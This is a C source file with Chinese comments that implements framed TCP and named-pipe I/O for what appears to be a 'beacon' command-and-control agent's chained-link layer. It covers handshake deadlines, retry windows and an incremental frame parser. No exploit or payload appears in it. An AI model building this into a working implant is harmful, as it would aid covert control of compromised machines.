#include "beacon_cascade.h"

#include "beacon_cascade_internal.h"
#include "beacon_context.h"


#define CASCADE_FRAME_MAGIC   0x43415331u /* CAS1 */
#define CASCADE_FRAME_VERSION 1u

/* WOULDBLOCK 轮询间隔：单次等待时长，预算由 CASCADE_IO_BLOCK_WINDOW_MS 表达 */
#define CASCADE_WOULDBLOCK_RETRY_SLEEP_MS 10

/*
 * TCP 非阻塞读写的“无进度”容忍窗口（ms）。
 * 旧实现等价于 MAX_RETRIES(500) × SLEEP(10) 的隐式 5 秒上限——用循环次数表达
 * 时间预算会被误读为纯重试健壮性；现改为显式时钟窗口，语义逐位等价：
 * 连续 WOULDBLOCK 持续到窗口上限即放弃，任意一次进度（收发成功）即重置，
 * 因此慢速但活跃的对端仍可无限期推进。
 */
#define CASCADE_IO_BLOCK_WINDOW_MS (5 * 1000)

/* 管道无数据时的轮询间隔 */
#define CASCADE_PIPE_POLL_SLEEP_MS 20

/* 单次 I/O 分块上限，避免大块传输长时间占用 */
#define CASCADE_IO_CHUNK_SIZE 0x100000


/* ===== 底层 I/O 辅助函数（供 ops 实现复用） ===== */

/* HELLO 握手等阻塞读的总 deadline（ms）：对端连接后不发数据时不得挂死主循环 */
#define CASCADE_HELLO_DEADLINE_MS (30 * 1000)

/*
 * 带总 deadline 的接收循环：用于握手阶段的主线程阻塞读。
 * 与 CascadeRecvAll 的区别在于：WSAEWOULDBLOCK 重试不再是无上限的
 * “500 次 ×10ms”，而是受统一时钟约束——对端 connect 成功后静默不出声时，
 * 最多 CASCADE_HELLO_DEADLINE_MS 即放弃，避免注册路径冻结 beacon 主循环。
 */
static BOOL CascadeRecvAllDeadline(SOCKET s, BYTE8* buf, SIZE_T len, DWORD deadline_ms)
{
    SIZE_T off = 0;
    ULONGLONG deadline = GetTickCount64() + deadline_ms;

    while (off < len) {
        INT n = recv(s, (CHAR*)buf + off, (INT)(len - off), 0);
        if (n > 0) {
            off += (SIZE_T)n;
        } else if (n == 0) {
            return FALSE;
        } else if (WSAGetLastError() == WSAEWOULDBLOCK) {
            if (GetTickCount64() >= deadline) return FALSE;
            Sleep(CASCADE_WOULDBLOCK_RETRY_SLEEP_MS);
        } else {
            return FALSE;
        }
    }
    return TRUE;
}

/* 接收指定字节数：无进度窗口内 WOULDBLOCK 自动重试（见 CASCADE_IO_BLOCK_WINDOW_MS） */
BOOL CascadeRecvAll(SOCKET s, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    ULONGLONG progress_at = GetTickCount64();

    while (off < len) {
        INT n = recv(s, (CHAR*)buf + off, (INT)(len - off), 0);
        if (n > 0) {
            off += (SIZE_T)n;
            progress_at = GetTickCount64();
        } else if (n == 0) {
            return FALSE;
        } else if (WSAGetLastError() == WSAEWOULDBLOCK) {
            if (GetTickCount64() - progress_at >= CASCADE_IO_BLOCK_WINDOW_MS) return FALSE;
            Sleep(CASCADE_WOULDBLOCK_RETRY_SLEEP_MS);
        } else {
            return FALSE;
        }
    }
    return TRUE;
}

/* 发送指定字节数：无进度窗口内 WOULDBLOCK 自动重试（见 CASCADE_IO_BLOCK_WINDOW_MS） */
BOOL CascadeSendAll(SOCKET s, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    ULONGLONG progress_at = GetTickCount64();

    while (off < len) {
        INT n = send(s, (const CHAR*)buf + off, (INT)(len - off), 0);
        if (n > 0) {
            off += (SIZE_T)n;
            progress_at = GetTickCount64();
        } else if (n == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) {
            if (GetTickCount64() - progress_at >= CASCADE_IO_BLOCK_WINDOW_MS) return FALSE;
            Sleep(CASCADE_WOULDBLOCK_RETRY_SLEEP_MS);
        } else {
            return FALSE;
        }
    }
    return TRUE;
}
/*
 * 使用 ReadFile 从管道/文件句柄读取指定字节数（无 overlapped，仅阻塞模式用）。
 * 当前 ops 实现走 CascadePipeReadAll（overlapped 感知），此函数保留作历史参考。
 */
static BOOL CascadeReadFileAll(HANDLE h, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        DWORD read = 0;
        DWORD avail = 0;
        DWORD chunk;

        if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)) {
            return FALSE;
        }
        if (avail == 0) {
            Sleep(CASCADE_PIPE_POLL_SLEEP_MS);
            continue;
        }

        chunk = (DWORD)(len - off);
        if (chunk > avail) chunk = avail;
        if (chunk > CASCADE_IO_CHUNK_SIZE) chunk = CASCADE_IO_CHUNK_SIZE;
        if (!ReadFile(h, buf + off, chunk, &read, NULL) || read == 0) {
            return FALSE;
        }
        off += (SIZE_T)read;
    }
    return TRUE;
}
/* 使用 WriteFile 向管道/文件句柄写入指定字节数 */
static BOOL CascadeWriteFileAll(HANDLE h, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        DWORD written = 0;
        DWORD chunk = (DWORD)((len - off) > CASCADE_IO_CHUNK_SIZE ? CASCADE_IO_CHUNK_SIZE : (len - off));
        if (!WriteFile(h, buf + off, chunk, &written, NULL) || written == 0) {
            return FALSE;
        }
        off += (SIZE_T)written;
    }
    return TRUE;
}

/*
 * 同步读管道（overlapped 感知）。
 * 若 CascadeIo 已关联事件对象，则使用 overlapped I/O 等待完成。
 */
BOOL CascadePipeReadAll(CascadeIo* io, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    HANDLE ev;

    if (!io || io->pipe == INVALID_HANDLE_VALUE) return FALSE;
    ev = io->read_event;

    while (off < len) {
        DWORD read_bytes = 0;
        DWORD chunk = (DWORD)((len - off) > CASCADE_IO_CHUNK_SIZE ? CASCADE_IO_CHUNK_SIZE : (len - off));

        if (ev) {
            ZeroMemory(&io->read_olap, sizeof(io->read_olap));
            io->read_olap.hEvent = ev;
            ResetEvent(ev);
        }

        if (!ReadFile(io->pipe, buf + off, chunk, &read_bytes, ev ? &io->read_olap : NULL)) {
            if (ev && GetLastError() == ERROR_IO_PENDING) {
                if (WaitForSingleObject(ev, INFINITE) != WAIT_OBJECT_0) return FALSE;
                if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) return FALSE;
            } else {
                return FALSE;
            }
        }
        if (read_bytes == 0) return FALSE;
        off += (SIZE_T)read_bytes;
    }
    return TRUE;
}

/*
 * 同步写管道（overlapped 感知）。
 * 若 CascadeIo 已关联事件对象，则使用 overlapped I/O 等待完成。
 */
BOOL CascadePipeWriteAll(CascadeIo* io, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    HANDLE ev;

    if (!io || io->pipe == INVALID_HANDLE_VALUE) return FALSE;
    ev = io->write_event;

    while (off < len) {
        DWORD written = 0;
        DWORD chunk = (DWORD)((len - off) > CASCADE_IO_CHUNK_SIZE ? CASCADE_IO_CHUNK_SIZE : (len - off));

        if (ev) {
            ZeroMemory(&io->write_olap, sizeof(io->write_olap));
            io->write_olap.hEvent = ev;
            ResetEvent(ev);
        }

        if (!WriteFile(io->pipe, buf + off, chunk, &written, ev ? &io->write_olap : NULL)) {
            if (ev && GetLastError() == ERROR_IO_PENDING) {
                if (WaitForSingleObject(ev, INFINITE) != WAIT_OBJECT_0) return FALSE;
                if (!GetOverlappedResult(io->pipe, &io->write_olap, &written, FALSE)) return FALSE;
            } else {
                return FALSE;
            }
        }
        if (written == 0) return FALSE;
        off += (SIZE_T)written;
    }
    return TRUE;
}

/* 初始化增量 cascade frame 读取器。 */
VOID CascadeFrameReaderInit(CascadeFrameReader* reader)
{
    if (!reader) return;
    ZeroMemory(reader, sizeof(*reader));
    BbInit(&reader->body);
}

/* 释放帧读取器持有的 body 缓冲区 */
VOID CascadeFrameReaderFree(CascadeFrameReader* reader)
{
    if (!reader) return;
    BbFree(&reader->body);
}

/*
 * 增量帧解析：将收到的数据喂入帧读取器。
 * 状态 0 累积 16 字节头部，状态 1 累积 body。
 * 返回消费字节数；出错返回 -1；无完整帧返回 0。
 */
INT CascadeFrameReaderFeed(CascadeFrameReader* reader, const BYTE8* data, SIZE_T len,
                           UINT16* cmd, ByteBuf* body)
{
    SIZE_T consumed = 0;

    if (!reader || !data || len == 0 || !cmd || !body) return -1;
    *cmd = 0;

    while (consumed < len) {
        if (reader->state == 0) {
            SIZE_T need = 16 - reader->hdr_off;
            SIZE_T avail = len - consumed;
            SIZE_T chunk = avail < need ? avail : need;

            CopyMemory(reader->hdr_buf + reader->hdr_off, data + consumed, chunk);
            reader->hdr_off += chunk;
            consumed += chunk;

            if (reader->hdr_off < 16) break;

            {
                UINT32 length = BeReadU32(reader->hdr_buf);
                UINT32 magic = BeReadU32(reader->hdr_buf + 4);
                UINT16 version = BeReadU16(reader->hdr_buf + 8);
                UINT32 body_len = BeReadU32(reader->hdr_buf + 12);

                if (magic != CASCADE_FRAME_MAGIC || version != CASCADE_FRAME_VERSION ||
                    length < 12 || length > CASCADE_MAX_FRAME_SIZE ||
                    body_len != length - 12) {
                    return -1;
                }

                reader->body_len = body_len;

                if (body_len == 0) {
                    *cmd = BeReadU16(reader->hdr_buf + 10);
                    BbInit(body);
                    reader->hdr_off = 0;
                    reader->state = 0;
                    return (INT)consumed;
                }

                BbFree(&reader->body);
                BbInit(&reader->body);
                if (!BbReserve(&reader->body, body_len)) {
                    return -1;
                }
                reader->state = 1;
                reader->body_off = 0;
            }
        } else {
            SIZE_T need = reader->body_len - reader->body_off;
            SIZE_T avail = len - consumed;
            SIZE_T chunk = avail < need ? avail : need;

            CopyMemory(reader->body.data + reader->body_off, data + consumed, chunk);
            reader->body_off += chunk;
            consumed += chunk;

            if (reader->body_off >= reader->body_len) {
                reader->body.len = reader->body_len;
                *cmd = BeReadU16(reader->hdr_buf + 10);
                *body = reader->body;
                BbInit(&reader->body);
                reader->hdr_off = 0;
                reader->state = 0;
                return (INT)consumed;
            }
        }
    }

    return (INT)consumed > 0 ? (INT)consumed : 0;
}

/*
 * 阻塞式帧读取（内部实现）。
 * 先读 4 字节长度，再读 12 字节固定头部，最后读 body。
 * hello_deadline_ms > 0 时启用总 deadline（仅 TCP 后端生效；0 = 无上限，
 * 保持数据面泵送路径的既有行为——数据面已有空闲清理与事件驱动机制约束）。
 */
static BOOL CascadeIoReadFrameImpl(CascadeIo* io, UINT16* cmd, ByteBuf* body, DWORD hello_deadline_ms)
{
    const CascadeIoOps* ops;
    BYTE8 hdr[4];
    BYTE8 fixed[12];
    UINT32 length;
    UINT32 magic;
    UINT16 version;
    UINT32 body_len;
    ULONGLONG deadline = 0; /* 握手总时钟；仅 hello_deadline_ms 且 TCP 时启用 */

    if (!io || !cmd || !body) return FALSE;
    BbInit(body);

    ops = CascadeIoOpsForKind(io->kind);
    if (!ops || !ops->ReadRaw) return FALSE;

    /* 握手 deadline 只对 TCP 后端有意义（pipe 后端 ReadRaw 自带 overlapped 语义） */
    if (hello_deadline_ms && io->kind == CASCADE_IO_TCP) {
        deadline = GetTickCount64() + hello_deadline_ms;
        SIZE_T off = 0;
        while (off < sizeof(hdr)) {
            INT n = recv(io->sock, (CHAR*)hdr + off, (INT)(sizeof(hdr) - off), 0);
            if (n > 0) {
                off += (SIZE_T)n;
            } else if (n == 0) {
                return FALSE;
            } else if (WSAGetLastError() == WSAEWOULDBLOCK) {
                if (GetTickCount64() >= deadline) return FALSE;
                Sleep(CASCADE_WOULDBLOCK_RETRY_SLEEP_MS);
            } else {
                return FALSE;
            }
        }
        /* 剩余头部与 body 已确认对端活跃，正常短读走通用路径 */
        length = BeReadU32(hdr);
        if (length < sizeof(fixed) || length > CASCADE_MAX_FRAME_SIZE) {
            return FALSE;
        }
        if (!CascadeRecvAllDeadline(io->sock, fixed, sizeof(fixed),
                                    (DWORD)(deadline - GetTickCount64()))) {
            return FALSE;
        }
    } else {
        if (!ops->ReadRaw(io, hdr, sizeof(hdr))) return FALSE;

        length = BeReadU32(hdr);
        if (length < sizeof(fixed) || length > CASCADE_MAX_FRAME_SIZE) {
            return FALSE;
        }

        if (!ops->ReadRaw(io, fixed, sizeof(fixed))) return FALSE;
    }

    magic = BeReadU32(fixed);
    version = BeReadU16(fixed + 4);
    *cmd = BeReadU16(fixed + 6);
    body_len = BeReadU32(fixed + 8);

    if (magic != CASCADE_FRAME_MAGIC || version != CASCADE_FRAME_VERSION ||
        body_len != length - sizeof(fixed)) {
        return FALSE;
    }

    if (body_len) {
        if (!BbReserve(body, body_len)) {
            return FALSE;
        }
        if (hello_deadline_ms && io->kind == CASCADE_IO_TCP) {
            if (!CascadeRecvAllDeadline(io->sock, body->data, body_len,
                                        (DWORD)(deadline - GetTickCount64()))) {
                BbFree(body);
                return FALSE;
            }
        } else if (!ops->ReadRaw(io, body->data, body_len)) {
            BbFree(body);
            return FALSE;
        }
        body->len = body_len;
    }

    return TRUE;
}

/* 数据面帧读取（行为不变） */
BOOL CascadeIoReadFrame(CascadeIo* io, UINT16* cmd, ByteBuf* body)
{
    return CascadeIoReadFrameImpl(io, cmd, body, 0);
}

/* 握手帧读取：HELLO 全程受 CASCADE_HELLO_DEADLINE_MS 约束，防止静默对端挂死注册路径 */
BOOL CascadeIoReadHelloFrame(CascadeIo* io, UINT16* cmd, ByteBuf* body)
{
    return CascadeIoReadFrameImpl(io, cmd, body, CASCADE_HELLO_DEADLINE_MS);
}

/*
 * 阻塞式帧写入，带写锁保护。
 * 组装 [4字节长度][12字节固定头][body] 后发送。
 */
BOOL CascadeIoWriteFrame(CascadeIo* io, UINT16 cmd, const ByteBuf* body)
{
    const CascadeIoOps* ops;
    ByteBuf frame;
    BYTE8 outer[4];
    BYTE8 fixed[12];
    UINT32 body_len;
    BOOL ok = FALSE;

    if (!io) return FALSE;
    ops = CascadeIoOpsForKind(io->kind);
    if (!ops || !ops->WriteRaw) return FALSE;

    body_len = (UINT32)(body ? body->len : 0);
    if (body_len > CASCADE_MAX_FRAME_SIZE - sizeof(fixed)) return FALSE;

    BbInit(&frame);
    BeWriteU32(outer, sizeof(fixed) + body_len);
    BeWriteU32(fixed, CASCADE_FRAME_MAGIC);
    BeWriteU16(fixed + 4, CASCADE_FRAME_VERSION);
    BeWriteU16(fixed + 6, cmd);
    BeWriteU32(fixed + 8, body_len);

    if (!BbAppend(&frame, outer, sizeof(outer)) ||
        !BbAppend(&frame, fixed, sizeof(fixed)) ||
        (body_len && !BbAppend(&frame, body->data, body->len))) {
        BbFree(&frame);
        return FALSE;
    }

    EnterCriticalSection(&io->write_lock);
    ok = ops->WriteRaw(io, frame.data, frame.len);
    LeaveCriticalSection(&io->write_lock);

    BbFree(&frame);
    return ok;
}
